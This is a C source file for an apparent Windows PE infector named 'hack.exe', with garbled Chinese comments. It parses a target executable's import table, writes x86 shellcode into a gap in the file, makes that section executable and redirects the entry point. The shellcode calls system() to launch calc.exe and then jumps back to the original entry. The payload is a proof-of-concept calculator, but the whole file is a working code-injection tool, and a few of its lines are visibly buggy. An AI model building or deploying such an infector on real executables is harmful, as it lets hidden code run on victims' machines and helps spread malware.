#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <stdint.h>
#include <ctype.h>
//�ڱ� 
struct section_header{
	uint8_t name[8];//����
	uint32_t virtualsize;
	uint32_t RVA;//�ڴ��е�ַ
	uint8_t size_of_raw_data[4];//�ڴ�С
	uint32_t file_address;//�ļ��е�ַ,RVA-file_addr�õ�������delta
	uint8_t notimportant[12];
	uint8_t character[4]; 
};

//IDT��
struct IDT_entry{
	uint32_t INT_pointer;//ָ��INT��
	uint32_t timestamp;
	uint32_t forwarderchain;
	uint32_t dll_name_pointer;//ָ��DLL����
	uint32_t IAT_pointer;//ָ��IAT��
};

//��ȡ�ļ��ֽ��� 
int file_size(char* filename)
{
    struct stat statbuf;
    stat(filename,&statbuf);
    int size=statbuf.st_size;
    return size;
}


uint32_t uint8to32(uint8_t fouruint8[4]) {
	return *(uint32_t*)fouruint8;	
}

uint16_t uint8to16(uint8_t fouruint8[2]) {
	return *(uint16_t*)fouruint8;	
}

uint32_t findgap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//���Ϊ0�����г���0
	for(uint32_t i=old_import_table_addr+old_import_table_size;i<old_import_table_addr+old_import_table_size+gapsize-20;i++){
			orresult=exebuffer[old_import_table_addr+old_import_table_size]|orresult;
	} 
	if(orresult==0)//���Բ��ð��,������Ҫ������ 
		return  old_import_table_addr;
	
	//��Ҫ��� 
	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr+old_import_table_size+gapsize-20;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//�ҵ���gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}

uint32_t finddatagap(uint8_t*exebuffer,uint32_t old_import_table_addr,uint32_t old_import_table_size,uint32_t gapsize,uint32_t buffersize)
{
	uint8_t orresult=0;//���Ϊ0�����г���0

	int flag=0;
	orresult=0;
	uint32_t index=old_import_table_addr;
	uint32_t gap_begin_addr=0;
	while(flag==0&&index<buffersize)
	{
		for(int i=0;i<gapsize;i++){
			if(exebuffer[index+i]!=0x00){
				orresult=1;
				index=index+i+1;
				break;
			}
		}
		if(orresult==0)//�ҵ���gap 
		{
			//printf("!find gap!\n");
			flag=1;
			gap_begin_addr=index;
			break;
		}
		orresult=0;
	}
	return gap_begin_addr;
}

int whichsection(struct section_header* the_section_header,uint32_t RVA,int sections){
	int offset=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(RVA>=the_section_header[i].RVA&&
			     RVA<the_section_header[i+1].RVA)
			{
				offset=i;
				break;
			}
		}
		else if(i==sections-1){
			offset=i;
			break;
		}
	}
	return offset;
}

int main(int argc,char**argv){
	
	
	FILE *fp=NULL;
	int filesize=0;//�ļ����ֽ��� 
	if(argc!=2){
		printf("use like this:  hack.exe target.exe!\n");
		return 0;
	}
	
	fp=fopen(argv[1],"rb+");
	if(fp==NULL){
		printf("open file %s failed!\n",argv[1]);
		return 0;
	}
	filesize=file_size(argv[1]);//�ļ��ܴ�С
	uint8_t  *exebuffer=(uint8_t*)malloc(filesize);//Ҫд�أ���С��Ҫ����ı�
	
	int readsize=fread(exebuffer,1,filesize,fp);
	if(readsize==0){
		printf("read %s failed!\n",argv[1]);
		return 0;
	}
	else{
		printf("filesize is %d, readsize is %d\n",filesize,readsize);
	} 
	//����ǲ���PE�ļ� 
	uint16_t pehead=uint8to16(exebuffer);
	if(pehead!=0x5a4d){
		printf("PE head is %0X,not a PE file!\n",pehead);
		return 0;
	}
	
	uint32_t NT_header_index=uint8to32(&exebuffer[60]);//0x3C
	//printf("NT header is at %0X\n",NT_header_index);
	uint32_t signature=uint8to32(&exebuffer[NT_header_index]);
	//"PE" 50 45
	if(signature!=0x4550){
		printf("PE head is %0X,not a PE file!\n",signature);
		return 0;
	}
	
	uint16_t sections=uint8to16(&exebuffer[NT_header_index+4+2]);//�ж��ٸ���,������Ҫ�����ٸ��ڱ� 
	//0x4+0x14=20�ֽڣ���ѡͷ��NT_header_index+24��ʼ
	uint16_t option_header_size=uint8to16(&exebuffer[NT_header_index+4+16]);//��ѡͷ��С 
	
	uint32_t option_header_index=NT_header_index+24;//��ѡͷ��ʼ 
	uint32_t num_of_directory=uint8to32(&exebuffer[option_header_index+92]);//0x5C,һ����0x10
	//ÿ��8�ֽڣ�������ڵ�2��,Ŀ¼��1����ƫ��option_header_index��0x60=96 
	uint32_t* import_table_addr=(uint32_t*)&exebuffer[option_header_index+96+8];//֮�����Ҫ��� 
	uint32_t* import_table_size=(uint32_t*)&exebuffer[option_header_index+96+12];//ֱ��ʹ��ָ�룬֮��Ҫ��20 
	 
	//uint32_t* bound_table_addr=(uint32_t*)&exebuffer[option_header_index+96+88];//����󶨱��еĻ������ 
	//uint32_t* bound_table_size=(uint32_t*)&exebuffer[option_header_index+96+92];//��0	
	uint32_t* entrypoint=(uint32_t*)&exebuffer[option_header_index+16];
	uint32_t* imagebase=(uint32_t*)&exebuffer[option_header_index+28];
	
	printf("enrty point is %0X\n",*entrypoint);
	printf("imagebase is %0X\n",*imagebase);
	
	uint32_t *section_delta_offset=(uint32_t*)malloc(sections*sizeof(uint32_t));
	struct section_header *the_section_header=
	     (struct section_header *)malloc(sections*sizeof(struct section_header));
	memset(the_section_header,0,sections*40);
	//memcpy(the_section_header,&exebuffer[option_header_index+option_header_size],sections*40);
	the_section_header=(section_header *)&exebuffer[option_header_index+option_header_size];//pointer now 
	//ͨ��pointer to raw data�ж��������ĸ������棬��Ҫʹ���ĸ��ڵ�delta 
	//file_offset+delta=RVA��PE�ļ��м�¼����RVA 
	//ͬʱ��¼.data�ڵ���� 
	int datasectionnum=-1;
	for(int i=0;i<sections;i++){
		section_delta_offset[i]=the_section_header[i].RVA - 
		                        the_section_header[i].file_address;
		if(!strcmp((char*)the_section_header[i].name,".data")||!strcmp((char*)the_section_header[i].name,"data"))
			datasectionnum=i;
	}
	printf("data section  is in the %d place. \n",datasectionnum);
	//Ѱ�ҿ�϶ 20�ֽ�IDT���4�ֽ�ָ��[INT]��20�ֽں�����ź�����4�ֽ�ǰ��ָ���INT��β 
	//16�ֽڵ�Func.dll���֣�IAT��ָ�룬��IAT��0000000 
	uint32_t  gapsize=150;//������Ҫ��ô��Ŀ�϶,���ֽڶ��� 
	//�����ҿ�϶�����ؿ�ʼ���ļ�ƫ�ƺţ���������Ҳ���������ֱ��һ������.data���� 
	//��Ҫ�Ȱ�������RVAתΪ�ļ�ƫ��
	uint32_t import_table_fileaddr=0;
	int idt_offset=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(*import_table_addr>=the_section_header[i].RVA && *import_table_addr<the_section_header[i+1].RVA)
			{
				import_table_fileaddr=*import_table_addr-section_delta_offset[i];
				idt_offset=i;
				break;
			}
		}
		else if(i==sections-1){
			import_table_fileaddr=*import_table_addr-section_delta_offset[i];
			idt_offset=i;
			break;
		}
	} 
	
	struct IDT_entry *the_IDT=(IDT_entry *)malloc(sizeof(import_table_size-20));
	memcpy(the_IDT,&exebuffer[import_table_fileaddr],*import_table_size-20);
	int kernel32_idt_index=0;
	//ͨ��IDT��ĵ�4����Ա��Ѱ��kernel32.dll
	for(int i=0;i<(*import_table_size-20)/20;i++){	
		//printf("dll name is %s\n",&exebuffer[the_IDT[i].dll_name_pointer-section_delta_offset[idt_offset]]);
		if(!strcmp(strupr((char*)&exebuffer[the_IDT[i].dll_name_pointer-section_delta_offset[idt_offset]]),"KERNEL32.DLL"))
		{
			kernel32_idt_index=i;//��¼kernel32.dll���ĸ�IDT���� 
			printf("found kernal32.dll!\n");
		}
	}
	
	
	
	//�ж�kernel32.dll��INT���ĸ��ڣ�����RVA���ļ�ƫ�Ƶ�ת��ֵ 
	int INT_offset=whichsection(the_section_header,the_IDT[kernel32_idt_index].INT_pointer,sections);
	
	//�ж�kernel32.dll��IAT���ĸ��ڣ�����RVA���ļ�ƫ�Ƶ�ת��ֵ 
	int IAT_offset=whichsection(the_section_header,the_IDT[kernel32_idt_index].IAT_pointer,sections);

	//INT��IAT���ļ��еĵ�ַ 
	uint32_t kernel32_INT_firstindex=the_IDT[kernel32_idt_index].INT_pointer-section_delta_offset[INT_offset];
	uint32_t kernel32_IAT_firstindex=the_IDT[kernel32_idt_index].IAT_pointer-section_delta_offset[IAT_offset];
	//printf("INT begin at %0X\n",kernel32_INT_firstindex);
	//printf("IAT begin at %0X\n",kernel32_IAT_firstindex);
	
	//Ѱ��oadLibrary��GetPorcAddress��INT�е��±꡾�ڵڼ�������INT�к�IAT�е��±�һ�� 
	int subindex_LoadLibraryA=0;//
	int subindex_GetProcAddress=0;
	
	//��INT��һ��������� 
	uint32_t function_hint_name_entry=0;
	uint32_t hint_name_addr=0;
	uint32_t hint_name_section=0;
	for(int i=0;i>=0;i++){
		memcpy(&function_hint_name_entry,(uint32_t*)&exebuffer[kernel32_INT_firstindex]+i,4);
		if(function_hint_name_entry==0)
			break;
		hint_name_section=whichsection(the_section_header,function_hint_name_entry,sections);
		hint_name_addr=function_hint_name_entry-section_delta_offset[hint_name_section];
		if(!strcmp((char*)&exebuffer[hint_name_addr]+2,"LoadLibraryA")){
			subindex_LoadLibraryA=i;
			//printf("LoadLibraryA serial num is %d\n",i);
		}
		else if(!strcmp((char*)&exebuffer[hint_name_addr]+2,"GetProcAddress")){
			subindex_GetProcAddress=i;
			//printf("GetProcAddress serial num is %d\n",i);
		}
	}
	//�����Ȼû���ҵ�������  
	if(subindex_LoadLibraryA==0||subindex_GetProcAddress==0){
		printf("kernel32.dll no LoadLibraryA() or GetProcAddress()!!Failed!\n");
		return 0;
	}
	//ͨ��������±꣬��IAT�м���RVA 
	uint32_t LoadLibraryA_RVA=0;
	uint32_t GetProcAddress_RVA=0;
	
	LoadLibraryA_RVA=kernel32_IAT_firstindex+4*subindex_LoadLibraryA+section_delta_offset[IAT_offset];
	GetProcAddress_RVA=kernel32_IAT_firstindex+4*subindex_GetProcAddress+section_delta_offset[IAT_offset];
	
	printf("LoadLibraryA_RVA is %X\n",LoadLibraryA_RVA);
	printf("GetProcAddress_RVA is %X\n",GetProcAddress_RVA);
	
	//����VA 
	uint32_t LoadLibraryA_VA=LoadLibraryA_RVA+*imagebase;
	uint32_t GetProcAddress_VA=GetProcAddress_RVA+*imagebase;
	
	//Ѱ�ҿ�϶ 
	uint32_t gap_firstindex=findgap(exebuffer,import_table_fileaddr,*import_table_size,gapsize,filesize);
	//����ҵ�����ô��Ŀ�϶ 
	if(gap_firstindex!=0){
		gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
		printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
	}
	else//�������������ҵ���϶ 
	{
		gap_firstindex=finddatagap(exebuffer,the_section_header[datasectionnum].file_address,*import_table_size,gapsize,filesize);
		if(gap_firstindex!=0){
			gap_firstindex=gap_firstindex+4-(gap_firstindex%4);
			printf("Find enough gap! It starts at file-offset %0X\n",gap_firstindex);
		}
		else{
			printf("Operation failed! No enough gap to change!\n");
			return 0;
		}
	}	
	
	//��λgap���ڽ�,����offset�ͽ��� 
	uint32_t gap_firstRVA=0;
	for(int i=0;i<sections;i++){
		if(i!=sections-1)
		{
			if(gap_firstindex>=the_section_header[i].file_address && gap_firstindex<the_section_header[i+1].file_address)
			{
				gap_firstRVA=gap_firstindex+section_delta_offset[i];
				if(((uint8_t*)&the_section_header[i].virtualsize)[3]&0x20==0){
					((uint8_t*)&the_section_header[i].virtualsize)[3]+=0x20;//execute permission
				}
				break;
			}
		}
		else if(i==sections-1){
			gap_firstRVA=gap_firstindex+section_delta_offset[i];
			if(((uint8_t*)&the_section_header[i].virtualsize)[3]&0x20==0){
					((uint8_t*)&the_section_header[i].virtualsize)[3]+=0x20;//execute permission
				}
			break;
		}
	} 
	//printf("\nFirstRVA of the gap area is %0X,fileaddr is %0X\n",gap_firstRVA,gap_firstindex);
	
	//���˿�ʼ���ļ�ƫ�ƺ�RVA�����Կ�ʼ�ˣ��Ȱ�ԭ���ı��ƹ�ȥ 
	uint32_t rel_offset=0;//ʵʱƫ�� 
	
	
	uint32_t string_index=gap_firstindex+80;//�ַ�����ַ���ճ�100���ֽ� 
	uint32_t string_RVA=gap_firstRVA+80;
	uint32_t string_VA=gap_firstRVA+80+*imagebase;
	uint8_t maching_code[10];
	
	//���� "msvcrt.dll"���� 
	memcpy(&exebuffer[string_index],(void*)"msvcrt.dll",sizeof("msvcrt.dll"));
	
	//mov DWORD PTR SS:[ESP], "msvcrt.dll"��VA 
	memcpy(&exebuffer[gap_firstindex],(void*)"\xC7\x04\x24",3);
	rel_offset=rel_offset+3;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("msvcrt.dll string is at %X\n",string_VA);
	
	//mov EAX, DWORD PTR DS:LoadLibraryA()��ַ 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xA1",1);
	rel_offset=rel_offset+1;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&LoadLibraryA_VA,4);
	rel_offset=rel_offset+4;
	
	//call EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//����"system" 
	string_index=string_index+16;
	string_RVA=string_RVA+16;
	string_VA=string_VA+16;
	memcpy(&exebuffer[string_index],(void*)"system",sizeof("system"));
	
	//mov DWORD PTR SS:[ESP],"system"��VA 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xC7\x44\x24\x04",4);
	rel_offset=rel_offset+4;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("system string is at %X\n",string_VA);
	
	//mov DWORD PTR SS:[ESP],EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\x89\x04\x24",3);
	rel_offset=rel_offset+3;
	
	//mov EAX, DWORD PTR DS:GetProcAddress()��VA
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xA1",1);
	rel_offset=rel_offset+1;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&GetProcAddress_VA,4);
	rel_offset=rel_offset+4;
	printf("getprocaddr is at %X\n",GetProcAddress_VA);
	
	//call EAX 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//�����ַ��� 
	string_index=string_index+16;
	string_RVA=string_RVA+16;
	string_VA=string_VA+16;
	memcpy(&exebuffer[string_index],(void*)"C:/windows/system32/calc.exe",sizeof("C:/windows/system32/calc.exe"));
	
	//mov DWORD PTR SS:[ESP],"C:/windows/system32/calc.exe"��VA 
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xC7\x04\x24",3);
	rel_offset=rel_offset+3;
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&string_VA,4);
	rel_offset=rel_offset+4;
	printf("calc.exe string is at %X\n",string_VA);
	
	//call EAX
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xFF\xD0",2);
	rel_offset=rel_offset+2;
	
	//jmp previous_entrypoint
	uint32_t returnjmp=(uint32_t)0-(gap_firstRVA+rel_offset+5-*entrypoint);
	printf("returnjmp is %X\n",returnjmp);
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)"\xE9",1);
	rel_offset=rel_offset+1;
	
	memcpy(&exebuffer[gap_firstindex+rel_offset],(void*)&returnjmp,4);
	rel_offset=rel_offset+4;
	
	//change entrypoint
	*entrypoint=gap_firstRVA;
	

	printf("hack succesfully, open %s now!\n",argv[1]); 
	 
	free(section_delta_offset);
	free(the_section_header);
	rewind(fp);//ָ���ļ���ͷ 
	fwrite(exebuffer,1,filesize,fp);
	free(exebuffer);
	free(the_IDT);	
	fclose(fp);
	return 0;
}
